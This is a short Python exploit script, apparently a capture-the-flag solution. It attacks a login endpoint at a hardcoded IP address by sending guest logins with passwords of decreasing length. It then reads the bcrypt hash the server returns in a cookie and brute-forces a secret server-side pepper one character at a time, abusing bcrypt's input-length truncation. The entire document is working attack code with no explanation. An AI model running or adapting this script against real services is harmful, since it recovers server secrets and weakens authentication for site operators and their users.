import base64
import bcrypt
import string
import requests

URL = "http://34.84.32.212:8080"
pepper1 = "PmVG7xe9ECBSgLUA"

pepper2 = ""
for i in range(16):
    response = requests.post(
        URL,
        data={"auth": "guest", "password": "A" * (51 - (i + 1))},
        allow_redirects=False,
    )
    hash = base64.b64decode(response.cookies["hash"])

    if hash.startswith(b"$2y$"):
        hash = b"$2b$" + hash[4:]

    for j in string.printable:
        if bcrypt.checkpw(
            f"{pepper1}guest{'A' * (51 - (i + 1)) + pepper2 + j}".encode(), hash
        ):
            print(f"FOUND: {pepper2 + j}")
            pepper2 += j
            break
